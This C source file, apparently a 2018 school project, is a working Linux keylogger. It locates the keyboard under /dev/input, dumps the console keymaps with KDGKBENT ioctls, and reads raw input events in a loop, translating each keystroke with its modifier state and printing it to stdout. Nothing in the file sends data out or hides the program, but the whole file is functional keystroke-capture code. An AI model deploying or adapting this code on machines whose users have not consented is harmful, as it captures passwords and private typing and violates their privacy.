/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/09/28 05:57:11 by root              #+#    #+#             */
/*   Updated: 2018/10/31 18:37:48 by root             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <dirent.h>
#include <linux/input.h>
#include <signal.h>
#include <linux/keyboard.h>
#include <linux/kd.h>
#include <errno.h>

#include "keys.h"

#ifndef MAX_NR_KEYMAPS
# define MAX_NR_KEYMAPS NR_KEYMAPS
#endif

typedef struct 	s_event
{
	int			value;
	char 		*name;
}				t_event;

t_event	event[] = {
	{ EV_SYN, 				"EV_SYN" },
	{ EV_KEY, 				"EV_KEY" },
	{ EV_REL, 				"EV_REL" },
	{ EV_ABS, 				"EV_ABS" },
	{ EV_MSC, 				"EV_MSC" },
	{ EV_SW,				"EV_SW" },
	{ EV_LED,				"EV_LED" },
	{ EV_SND, 				"EV_SND" },
	{ EV_REP, 				"EV_REP" },
	{ EV_FF, 				"EV_FF" },
	{ EV_PWR, 				"EV_PWR" },
	{ EV_FF_STATUS, 		"EV_FF_STATUS" }
};

t_event msc[] = {
	{ MSC_SERIAL,			"MSC_SERIAL" },
	{ MSC_PULSELED,			"MSC_PULSELED" },
	{ MSC_GESTURE,			"MSC_GESTURE" },
	{ MSC_RAW,				"MSC_RAW" },
	{ MSC_SCAN,				"MSC_SCAN" },
	{ MSC_TIMESTAMP,		"MSC_TIMESTAMP" }
};

t_event led[] = {
	{ LED_NUML, 			"LED_NUML" },
	{ LED_CAPSL, 			"LED_CAPSL" },
	{ LED_SCROLLL, 			"LED_SCROLLL" },
	{ LED_COMPOSE, 			"LED_COMPOSE" },
	{ LED_KANA, 			"LED_KANA" },
	{ LED_SLEEP, 			"LED_SLEEP" },
	{ LED_SUSPEND, 			"LED_SUSPEND" },
	{ LED_MUTE, 			"LED_MUTE" },
	{ LED_MISC, 			"LED_MISC" },
	{ LED_MAIL, 			"LED_MAIL" },
	{ LED_CHARGING, 		"LED_CHARGING" }
};

t_event key[] = {
	{ KEY_RESERVED,			"RESERVED" },
	{ KEY_ESC,				"ESC" },
	{ KEY_1,				"1" },
	{ KEY_2,				"2" },
	{ KEY_3,				"3" },
	{ KEY_4,				"4" },
	{ KEY_5,				"5" },
	{ KEY_6,				"6" },
	{ KEY_7,				"7" },
	{ KEY_8,				"8" },
	{ KEY_9,				"9" },
	{ KEY_0,				"0" },
	{ KEY_MINUS,			"MINUS" },
	{ KEY_EQUAL,			"EQUAL" },
	{ KEY_BACKSPACE,		"BACKSPACE" },
	{ KEY_TAB,				"TAB" },
	{ KEY_Q,				"Q" },
	{ KEY_W,				"W" },
	{ KEY_E,				"E" },
	{ KEY_R,				"R" },
	{ KEY_T,				"T" },
	{ KEY_Y,				"Y" },
	{ KEY_U,				"U" },
	{ KEY_I,				"I" },
	{ KEY_O,				"O" },
	{ KEY_P,				"P" },
	{ KEY_LEFTBRACE,		"LEFTBRACE" },
	{ KEY_RIGHTBRACE,		"RIGHTBRACE" },
	{ KEY_ENTER,			"ENTER" },
	{ KEY_LEFTCTRL,			"LEFTCTRL" },
	{ KEY_A,				"A" },
	{ KEY_S,				"S" },
	{ KEY_D,				"D" },
	{ KEY_F,				"F" },
	{ KEY_G,				"G" },
	{ KEY_H,				"H" },
	{ KEY_J,				"J" },
	{ KEY_K,				"K" },
	{ KEY_L,				"L" },
	{ KEY_SEMICOLON,		"SEMICOLON" },
	{ KEY_APOSTROPHE,		"APOSTROPHE" },
	{ KEY_GRAVE,			"GRAVE" },
	{ KEY_LEFTSHIFT,		"LEFTSHIFT" },
	{ KEY_BACKSLASH,		"BACKSLASH" },
	{ KEY_Z,				"Z" },
	{ KEY_X,				"X" },
	{ KEY_C,				"C" },
	{ KEY_V,				"V" },
	{ KEY_B,				"B" },
	{ KEY_N,				"N" },
	{ KEY_M,				"M" },
	{ KEY_COMMA,			"COMMA" },
	{ KEY_DOT,				"DOT" },
	{ KEY_SLASH,			"SLASH" },
	{ KEY_RIGHTSHIFT,		"RIGHTSHIFT" },
	{ KEY_KPASTERISK,		"KPASTERISK" },
	{ KEY_LEFTALT,			"LEFTALT" },
	{ KEY_SPACE,			"SPACE" },
	{ KEY_CAPSLOCK,			"CAPSLOCK" },
	{ KEY_F1,				"F1" },
	{ KEY_F2,				"F2" },
	{ KEY_F3,				"F3" },
	{ KEY_F4,				"F4" },
	{ KEY_F5,				"F5" },
	{ KEY_F6,				"F6" },
	{ KEY_F7,				"F7" },
	{ KEY_F8,				"F8" },
	{ KEY_F9,				"F9" },
	{ KEY_F10,				"F10" },
	{ KEY_NUMLOCK,			"NUMLOCK" },
	{ KEY_SCROLLLOCK,		"SCROLLLOCK" },
	{ KEY_KP7,				"KP7" },
	{ KEY_KP8,				"KP8" },
	{ KEY_KP9,				"KP9" },
	{ KEY_KPMINUS,			"KPMINUS" },
	{ KEY_KP4,				"KP4" },
	{ KEY_KP5,				"KP5" },
	{ KEY_KP6,				"KP6" },
	{ KEY_KPPLUS,			"KPPLUS" },
	{ KEY_KP1,				"KP1" },
	{ KEY_KP2,				"KP2" },
	{ KEY_KP3,				"KP3" },
	{ KEY_KP0,				"KP0" },
	{ KEY_KPDOT,			"KPDOT" },
	{ 84,					"undefined" },
	{ KEY_ZENKAKUHANKAKU,	"ZENKAKUHANKAKU" },
	{ KEY_102ND,			"102ND" },
	{ KEY_F11,				"F11" },
	{ KEY_F12,				"F12" },
	{ KEY_RO,				"RO" },
	{ KEY_KATAKANA,			"KATAKANA" },
	{ KEY_HIRAGANA,			"HIRAGANA" },
	{ KEY_HENKAN,			"HENKAN" },
	{ KEY_KATAKANAHIRAGANA,	"KATAKANAHIRAGANA" },
	{ KEY_MUHENKAN,			"MUHENKAN" },
	{ KEY_KPJPCOMMA,		"KPJPCOMMA" },
	{ KEY_KPENTER,			"KPENTER" },
	{ KEY_RIGHTCTRL,		"RIGHTCTRL" },
	{ KEY_KPSLASH,			"KPSLASH" },
	{ KEY_SYSRQ,			"SYSRQ" },
	{ KEY_RIGHTALT,			"RIGHTALT" },
	{ KEY_LINEFEED,			"LINEFEED" },
	{ KEY_HOME,				"HOME" },
	{ KEY_UP,				"UP" },
	{ KEY_PAGEUP,			"PAGEUP" },
	{ KEY_LEFT,				"LEFT" },
	{ KEY_RIGHT,			"RIGHT" },
	{ KEY_END,				"END" },
	{ KEY_DOWN,				"DOWN" },
	{ KEY_PAGEDOWN,			"PAGEDOWN" },
	{ KEY_INSERT,			"INSERT" },
	{ KEY_DELETE,			"DELETE" },
	{ KEY_MACRO,			"MACRO" },
	{ KEY_MUTE,				"MUTE" },
	{ KEY_VOLUMEDOWN,		"VOLUMEDOWN" },
	{ KEY_VOLUMEUP,			"VOLUMEUP" },
	{ KEY_POWER,			"POWER" },
	{ KEY_KPEQUAL,			"KPEQUAL" },
	{ KEY_KPPLUSMINUS,		"KPPLUSMINUS" },
	{ KEY_PAUSE,			"PAUSE" },
	{ KEY_SCALE,			"SCALE" },
	{ KEY_KPCOMMA,			"KPCOMMA" },
	{ KEY_HANGEUL,			"HANGEUL" },
//	{ KEY_HANGUEL,			"HANGUEL" },
	{ KEY_HANJA,			"HANJA" },
	{ KEY_YEN,				"YEN" },
	{ KEY_LEFTMETA,			"LEFTMETA" },
	{ KEY_RIGHTMETA,		"RIGHTMETA" },
	{ KEY_COMPOSE,			"COMPOSE" },
	{ KEY_STOP,				"STOP" },
	{ KEY_AGAIN,			"AGAIN" },
	{ KEY_PROPS,			"PROPS" },
	{ KEY_UNDO,				"UNDO" },
	{ KEY_FRONT,			"FRONT" },
	{ KEY_COPY,				"COPY" },
	{ KEY_OPEN,				"OPEN" },
	{ KEY_PASTE,			"PASTE" },
	{ KEY_FIND,				"FIND" },
	{ KEY_CUT,				"CUT" },
	{ KEY_HELP,				"HELP" },
	{ KEY_MENU,				"MENU" },
	{ KEY_CALC,				"CALC" },
	{ KEY_SETUP,			"SETUP" },
	{ KEY_SLEEP,			"SLEEP" },
	{ KEY_WAKEUP,			"WAKEUP" },
	{ KEY_FILE,				"FILE" },
	{ KEY_SENDFILE,			"SENDFILE" },
	{ KEY_DELETEFILE,		"DELETEFILE" },
	{ KEY_XFER,				"XFER" },
	{ KEY_PROG1,			"PROG1" },
	{ KEY_PROG2,			"PROG2" },
	{ KEY_WWW,				"WWW" },
	{ KEY_MSDOS,			"MSDOS" },
	{ KEY_COFFEE,			"COFFEE" },
//	{ KEY_SCREENLOCK,		"SCREENLOCK" },
	{ KEY_ROTATE_DISPLAY,	"ROTATE_DISPLAY" },
//	{ KEY_DIRECTION,		"DIRECTION" },
	{ KEY_CYCLEWINDOWS,		"CYCLEWINDOWS" },
	{ KEY_MAIL,				"MAIL" },
	{ KEY_BOOKMARKS,		"BOOKMARKS" },
	{ KEY_COMPUTER,			"COMPUTER" },
	{ KEY_BACK,				"BACK" },
	{ KEY_FORWARD,			"FORWARD" },
	{ KEY_CLOSECD,			"CLOSECD" },
	{ KEY_EJECTCD,			"EJECTCD" },
	{ KEY_EJECTCLOSECD,		"EJECTCLOSECD" },
	{ KEY_NEXTSONG,			"NEXTSONG" },
	{ KEY_PLAYPAUSE,		"PLAYPAUSE" },
	{ KEY_PREVIOUSSONG,		"PREVIOUSSONG" },
	{ KEY_STOPCD,			"STOPCD" },
	{ KEY_RECORD,			"RECORD" },
	{ KEY_REWIND,			"REWIND" },
	{ KEY_PHONE,			"PHONE" },
	{ KEY_ISO,				"ISO" },
	{ KEY_CONFIG,			"CONFIG" },
	{ KEY_HOMEPAGE,			"HOMEPAGE" },
	{ KEY_REFRESH,			"REFRESH" },
	{ KEY_EXIT,				"EXIT" },
	{ KEY_MOVE,				"MOVE" },
	{ KEY_EDIT,				"EDIT" },
	{ KEY_SCROLLUP,			"SCROLLUP" },
	{ KEY_SCROLLDOWN,		"SCROLLDOWN" },
	{ KEY_KPLEFTPAREN,		"KPLEFTPAREN" },
	{ KEY_KPRIGHTPAREN,		"KPRIGHTPAREN" },
	{ KEY_NEW,				"NEW" },
	{ KEY_REDO,				"REDO" },
	{ KEY_F13,				"F13" },
	{ KEY_F14,				"F14" },
	{ KEY_F15,				"F15" },
	{ KEY_F16,				"F16" },
	{ KEY_F17,				"F17" },
	{ KEY_F18,				"F18" },
	{ KEY_F19,				"F19" },
	{ KEY_F20,				"F20" },
	{ KEY_F21,				"F21" },
	{ KEY_F22,				"F22" },
	{ KEY_F23,				"F23" },
	{ KEY_F24,				"F24" },
	{ 195,					"undefined" },
	{ 196,					"undefined" },
	{ 197,					"undefined" },
	{ 198,					"undefined" },
	{ 199,					"undefined" },
	{ KEY_PLAYCD,			"PLAYCD" },
	{ KEY_PAUSECD,			"PAUSECD" },
	{ KEY_PROG3,			"PROG3" },
	{ KEY_PROG4,			"PROG4" },
	{ KEY_DASHBOARD,		"DASHBOARD" },
	{ KEY_SUSPEND,			"SUSPEND" },
	{ KEY_CLOSE,			"CLOSE" },
	{ KEY_PLAY,				"PLAY" },
	{ KEY_FASTFORWARD,		"FASTFORWARD" },
	{ KEY_BASSBOOST,		"BASSBOOST" },
	{ KEY_PRINT,			"PRINT" },
	{ KEY_HP,				"HP" },
	{ KEY_CAMERA,			"CAMERA" },
	{ KEY_SOUND,			"SOUND" },
	{ KEY_QUESTION,			"QUESTION" },
	{ KEY_EMAIL,			"EMAIL" },
	{ KEY_CHAT,				"CHAT" },
	{ KEY_SEARCH,			"SEARCH" },
	{ KEY_CONNECT,			"CONNECT" },
	{ KEY_FINANCE,			"FINANCE" },
	{ KEY_SPORT,			"SPORT" },
	{ KEY_SHOP,				"SHOP" },
	{ KEY_ALTERASE,			"ALTERASE" },
	{ KEY_CANCEL,			"CANCEL" },
	{ KEY_BRIGHTNESSDOWN,	"BRIGHTNESSDOWN" },
	{ KEY_BRIGHTNESSUP,		"BRIGHTNESSUP" },
	{ KEY_MEDIA,			"MEDIA" },
	{ KEY_SWITCHVIDEOMODE,	"SWITCHVIDEOMODE" },
	{ KEY_KBDILLUMTOGGLE,	"KBDILLUMTOGGLE" },
	{ KEY_KBDILLUMDOWN,		"KBDILLUMDOWN" },
	{ KEY_KBDILLUMUP,		"KBDILLUMUP" },
	{ KEY_SEND,				"SEND" },
	{ KEY_REPLY,			"REPLY" },
	{ KEY_FORWARDMAIL,		"FORWARDMAIL" },
	{ KEY_SAVE,				"SAVE" },
	{ KEY_DOCUMENTS,		"DOCUMENTS" },
	{ KEY_BATTERY,			"BATTERY" },
	{ KEY_BLUETOOTH,		"BLUETOOTH" },
	{ KEY_WLAN,				"WLAN" },
	{ KEY_UWB,				"UWB" },
	{ KEY_UNKNOWN,			"UNKNOWN" },
	{ KEY_VIDEO_NEXT,		"VIDEO_NEXT" },
	{ KEY_VIDEO_PREV,		"VIDEO_PREV" },
	{ KEY_BRIGHTNESS_CYCLE,	"BRIGHTNESS_CYCLE" },
	{ KEY_BRIGHTNESS_AUTO,	"BRIGHTNESS_AUTO" },
//	{ KEY_BRIGHTNESS_ZERO,	"BRIGHTNESS_ZERO" },
	{ KEY_DISPLAY_OFF,		"DISPLAY_OFF" },
	{ KEY_WWAN,				"WWAN" },
//	{ KEY_WIMAX,			"WIMAX" },
	{ KEY_RFKILL,			"RFKILL" },
	{ KEY_MICMUTE,			"MICMUTE" },
	{ 249,					"undefined" },
	{ 250,					"undefined" },
	{ 251,					"undefined" },
	{ 252,					"undefined" },
	{ 253,					"undefined" },
	{ 254,					"undefined" },
	{ 255,					"undefined" }
};

typedef struct 	s_modifiers
{
	int 		value;
	int 		bit;
	char 		*name;
}				t_modifiers;

#define KG_JENAIBESOIN 10
t_modifiers modifiers[] = {
	{ 0, 				KG_SHIFT,		"shift"},
	{ KEY_RIGHTALT, 	KG_ALTGR,		"altgr"},
	{ 0, 				KG_CTRL,		"control"},
	{ KEY_LEFTALT, 		KG_ALT,			"alt"},
	{ KEY_LEFTSHIFT, 	KG_SHIFTL,		"shiftl"},
	{ KEY_RIGHTSHIFT, 	KG_SHIFTR,		"shiftr"},
	{ KEY_LEFTCTRL, 	KG_CTRLL,		"ctrll"},
	{ KEY_RIGHTCTRL, 	KG_CTRLR,		"ctrlr"},
	{ KEY_RIGHTMETA, 	KG_JENAIBESOIN,		"command"}
};

int						loop;

void 					sigint(int sig)
{
	(void)sig;
	loop = 0;
}

static int			filter(const struct dirent *file)
{
	char			filename[512];
	struct stat		filestat;

	snprintf(filename, sizeof(filename), "%s%s", "/dev/input/", file->d_name);
	if (stat(filename, &filestat))
		return 0;
	return S_ISCHR(filestat.st_mode);
}

static char			*get_keyboard()
{
	int				num;
	struct dirent	**files;
	int32_t			event_bitmap;
	int32_t			keybd_bitmap;
	char			filename[512];
	int				fd;
	char			*keybd;

	if ((num = scandir("/dev/input/", &files, &filter, &alphasort)) < 0)
		return NULL;
	keybd = NULL;
	for (int i = 0; i < num; i++)
	{
		if (!keybd)
		{
			event_bitmap = 0;
			keybd_bitmap = KEY_A | KEY_B | KEY_C | KEY_Z;
			snprintf(filename, sizeof(filename), "%s%s", "/dev/input/", files[i]->d_name);
			fd = open(filename, O_RDONLY);
			if (fd != -1)
			{
				ioctl(fd, EVIOCGBIT(0, sizeof(event_bitmap)), &event_bitmap);
				if ((EV_KEY & event_bitmap) == EV_KEY)
				{
					ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(event_bitmap)), &event_bitmap);
					if ((keybd_bitmap & event_bitmap) == keybd_bitmap)
						keybd = strdup(filename);
				}
				close(fd);
			}
		}
		free(files[i]);
	}
	free(files);
	return keybd;
}

static int  		print_keysym(int code)
{
	int 			type;
	int 			value;
	const char 		*p;

	type = KTYP(code);
	value = KVAL(code);
	if (type >= syms_size) {
		code = code ^ 0xf000;
		if (code < 0)
			return printf("(null) ");
		if (code < 0x80)
			return printf("%s", iso646_syms[code]);
		return printf("%#04x", code);
	}
	if (type == KT_LETTER)
		type = KT_LATIN;
	if (type < syms_size && value < syms[type].size && (p = syms[type].table[value])[0])
		return printf("%s", p);
	if (type == KT_META && value < 128 && value < syms[0].size && (p = syms[0].table[value])[0])
		return printf("Meta_%s", p);
	return printf("%#04x", code);
}

static int 			isprintable(int code)
{
	return code >= ' ' && code <= '~';
}

static void				keylogger(int keybd, int **key_table, int nb_keys, int nb_keymap)
{
	int					nbread;
	struct input_event	events[128];
	int 				modifier = 0; // Ctrl, Shift, Alt keys
	int 				value = 0; // which key have been pressed
	int 				state = 0; // state 0: released 1:pressed 2:repeated
	int 				capslock = 0;
	int 				numlock = 0;

	signal(SIGINT, sigint);
	loop = 1;
	while (loop)
	{
		nbread = read(keybd, events, sizeof(struct input_event) * 128);
		// for (size_t i = 0; i < nbread / sizeof(struct input_event); i++)
		// {
		// 	char *name = "UNKNOWN";
		// 	for (size_t j = 0; j < sizeof(event); j++)
		// 	{
		// 		if (events[i].type == event[j].value)
		// 		{
		// 			name = event[j].name;
		// 			break ;
		// 		}
		// 	}
		// 	printf("type: %s ", name);
		// 	if (events[i].type == EV_KEY)
		// 	{
		// 		int value = events[i].code;
		// 		int c = (events[i].code < nb_keys) ? key_table[events[i].code][0] : -1;
		// 		name = key[events[i].code].name;
		// 		printf("code: %c(%x \"%s\") ", c, value, name);
		// 	}
		// 	else if (events[i].type == EV_LED)
		// 	{
		// 		name = "UNKNOWN";
		// 		for (size_t j = 0; j < sizeof(led); j++)
		// 		{
		// 			if (events[i].code == led[j].value)
		// 			{
		// 				name = led[j].name;
		// 				break ;
		// 			}
		// 		}
		// 		printf("code: %s ", name);
		// 	}
		// 	else if (events[i].type == EV_MSC)
		// 	{
		// 		name = "UNKNOWN";
		// 		for (size_t j = 0; j < sizeof(key); j++)
		// 		{
		// 			if (events[i].code == msc[j].value)
		// 			{
		// 				name = msc[j].name;
		// 				break ;
		// 			}
		// 		}
		// 		printf("code: %s ", name);
		// 	} else {
		// 		printf("code: %x ", events[i].code);
		// 	}
		// 	printf("value: %#06x ; ", events[i].value);
		// }
		// printf("\n");

		int key = 0;
		for (size_t i = 0; i < nbread / sizeof(struct input_event); i++)
		{
			if (events[i].type == EV_LED) {
				if (events[i].code == LED_CAPSL)
					capslock = events[i].value;
				else if (events[i].code == LED_NUML)
					numlock = events[i].value;
			}
			else if (events[i].type == EV_KEY) {
				value = events[i].code;
				state = events[i].value;
			}
		}
		if (value == KEY_LEFTSHIFT || value == KEY_RIGHTSHIFT) {
			if (state == 0)
				modifier -= ((1 << modifiers[0].bit)); // update position on the character table values
			else if (state == 1)
				modifier += ((1 << modifiers[0].bit)); // update position on the character table values
			state = 0;
		}
		else if (value == KEY_RIGHTCTRL || value == KEY_LEFTCTRL) {
			if (state == 0)
				modifier -= ((1 << modifiers[2].bit)); // update position on the character table values
			else if (state == 1)
				modifier += ((1 << modifiers[2].bit)); // update position on the character table values
			state = 0;
		}
		else if (value == KEY_LEFTALT) {
			if (state == 0)
				modifier -= ((1 << modifiers[3].bit)); // update position on the character table values
			else if (state == 1)
				modifier += ((1 << modifiers[3].bit)); // update position on the character table values
			state = 0;
		}
		else if (value == KEY_RIGHTALT) {
			if (state == 0)
				modifier -= ((1 << modifiers[1].bit)); // update position on the character table values
			else if (state == 1)
				modifier += ((1 << modifiers[1].bit)); // update position on the character table values
			state = 0;
		}
		else if (value == KEY_RIGHTMETA) {
			if (state == 0)
				modifier -= ((1 << modifiers[8].bit)); // update position on the character table values
			else if (state == 1)
				modifier += ((1 << modifiers[8].bit)); // update position on the character table values
//			state = 0;
		}
		fflush(stdout);
		// for (size_t i = 0; i < sizeof(modifiers) / sizeof(*modifiers); i++) {
		// 	if (value == modifiers[i].value) {
		// 		if (state == 0)
		// 			modifier -= ((1 << modifiers[i].bit)); // update position on the character table values
		// 		else if (state == 1)
		// 			modifier += ((1 << modifiers[i].bit)); // update position on the character table values
		// 		state = 0;
		// 		break ;
		// 	}
		// }
		if (state) {
			// if (modifier) {
			// 	for (size_t i = 0; i < sizeof(modifiers) / sizeof(*modifiers); i++) {
			// 		if (modifier & (1 << modifiers[i].bit))
			// 			printf("<%s>+", modifiers[i].name);
			// 	}
			// 	key = key_table[value][0];
			// 	print_keysym(key);
			// }
			key = key_table[value][modifier];
			// if (isprintable(key))
			// 	printf("%c", key);
			// else
				print_keysym(key);
			fflush(stdout);
			/* printf(" : key_table[%d][%d] = %d\n", value, modifier, key); */
			/* for (int j = 0; j < nb_keymap; j++) { */
			/* 	printf("%5ld ", key_table[value][j]); */
			/* 	print_keysym(key_table[value][j]); */
			/* 	printf("(%c)", key_table[value][j]); */
			/* 	if (j && j % 5 == 0) */
			/* 		printf("\n>"); */
			/* 	else */
			/* 		printf(" | "); */
			/* } */
			/* printf("\n"); */
		}
	}
}

int 				get_fd();
int					get_keymaps(int, int (*)[256]);
int					**dump_keys(int, int, int, int (*)[256]);

static int			has_keys(int fd, int n)
{
	struct kbentry	ke;

	ke.kb_table = 0;
	ke.kb_index = n;
	return !ioctl(fd, KDGKBENT, (unsigned long)&ke);
}

static void 		free_tab(int ***tab)
{
	int			**ptr;

	if (tab && *tab)
	{
		ptr = *tab;
		while (ptr)
			free(*ptr++);
		free(*tab);
		*tab = NULL;
	}
}

int					main(void)
{
	int				fd;
	int				nb_keys;
	int 			nb_keymap;
	int 			keymaps[2][MAX_NR_KEYMAPS];
	int				**key_table;
	char			*keyboard;

	if ((fd = get_fd()) < 0)
		return 1;
	nb_keys = (has_keys(fd, 255) ? 256 : has_keys(fd, 127) ? 128 : 112);
	if ((nb_keymap = get_keymaps(fd, keymaps)) == 0)
		return 1;
	key_table = dump_keys(fd, nb_keys, nb_keymap, keymaps);
	close(fd);
	if (key_table == NULL)
		return 1;
	if ((keyboard = get_keyboard()) == NULL) {
		free_tab(&key_table);
		return 1;
	}
	if ((fd = open(keyboard, O_RDONLY)) < 0) {
		free(keyboard);
		free_tab(&key_table);
		return 1;
	}
	for (int i = 0; i < sizeof(modifiers) / sizeof(*modifiers); i++) {
		printf("%s\t%d\t%d\n", modifiers[i].name, modifiers[i].bit, modifiers[i].value);
	}
	printf("keyboard: %s\n", keyboard);
	free(keyboard);
	keylogger(fd, key_table, nb_keys, nb_keymap);
	close(fd);
	return 0;
}

static int			is_a_console(int fd)
{
	char			arg;

	arg = 0;
	return (ioctl(fd, KDGKBTYPE, &arg) == 0 && ((arg == KB_101) || (arg == KB_84)));
}

int					get_fd()
{
	char			*console[] = { "/dev/tty", "/dev/tty0", "/dev/vc/0", "/dev/console" };
	int				fd;

	fd = -1;
	for (size_t i = 0; i < sizeof(console) / sizeof(*console); i++)
	{
		fd = open(console[i], O_RDWR);
		if (fd < 0 && errno == EACCES)
			fd = open(console[i], O_WRONLY);
		if (fd < 0 && errno == EACCES)
			fd = open(console[i], O_RDONLY);
		if (fd < 0)
			continue ;
		if (is_a_console(fd))
			break ;
		close(fd);
		fd = -1;
	}
	if (fd < 0)
		for (fd = 0; fd < 3; fd++)
			if (is_a_console(fd))
				break ;
	if (fd < 0)
		fprintf(stderr, "Can't get a file descriptor refering to a terminal\n");
	return fd;
}

int					get_keymaps(int fd, int keymaps[2][256])
{
	int 			keymapnbr;
	struct kbentry	ke;

	printf("KEYMAPS\n");
	keymapnbr = 0;
	for (int i = 0; i < MAX_NR_KEYMAPS; i++)	
	{
		ke.kb_index = 0;
		ke.kb_table = i;
		int j = ioctl(fd, KDGKBENT, (unsigned long)&ke);
		if (j && errno != EINVAL) {
			perror("KDGKBENT");
			fprintf(stderr, "KDBGENT error at index 0 in table %d\n", i);
			return 0;
		}
		if (!j && ke.kb_value != K_NOSUCHMAP) {
			keymaps[0][i] = keymapnbr;
			keymaps[1][keymapnbr++] = i;
		} else {
			keymaps[0][i] = -1;
		}
		// printf("%03d %-5d %-15d %d\n", i, keymaps[0][i], keymaps[1][keymapnbr], keymapnbr);
	}
	if (keymapnbr == 0)
		fprintf(stderr, "cannot find any keymaps\n");
	if (keymaps[1][0] != 0)
		fprintf(stderr, "plain map not alocated !? o_O ?!");
	return keymapnbr;
}

static int			**allocate_keys(size_t len1, size_t len2)
{
	int				**key_table;

	key_table = malloc(sizeof(*key_table) * (len1 + 1));
	if (key_table == NULL) {
		fprintf(stderr, "Can't allocate %do for keys\n", len1);
		return NULL;
	}
	for (int i = 0; i < len1; i++)
	{
		key_table[i] = malloc(sizeof(**key_table) * len2);
		if (key_table[i] == NULL) {
			fprintf(stderr, "Can't allocate %do for %dth key\n", len2, i);
			for (int j = 0; j < i; j++)
				free(key_table[j]);
			free(key_table);
			return NULL;
		}
	}
	key_table[len1] = NULL;
	return key_table;
}

static int			get_bind(int fd, u_char index, u_char table)
{
	struct kbentry	ke;

	ke.kb_index = index;
	ke.kb_table = table;
	if (ioctl(fd, KDGKBENT, (unsigned long)&ke)) {
		perror("KDGKBENT");
		fprintf(stderr, "KDGKBENT error at index %d in table %d\n", index, table);
		return -1;
	}
	return ke.kb_value;
}

int 				**dump_keys(int fd, int nb_keys, int nb_keymap, int keymaps[2][256])
{
	int				**key_table;

	printf("DUMPKEYS\n");
	key_table = allocate_keys(nb_keys, nb_keymap);
	if (key_table == NULL) {
		return NULL;
	}
	for (int i = 0; i < nb_keys; i++) {
		// printf("%03d(%s):\n", i, key[i].name);
		for (int j = 0; j < nb_keymap; j++) {
			key_table[i][j] = get_bind(fd, i, keymaps[1][j]);
			// printf(">%03d %x", keymaps[1][j], key_table[i][j]);
			// if (isprintable(key_table[i][j]))
			// 	printf("(%c) ", key_table[i][j]);
			// else
			// 	print_keysym(key_table[i][j]);
		}
		// printf("\n");
	}
	return key_table;
}
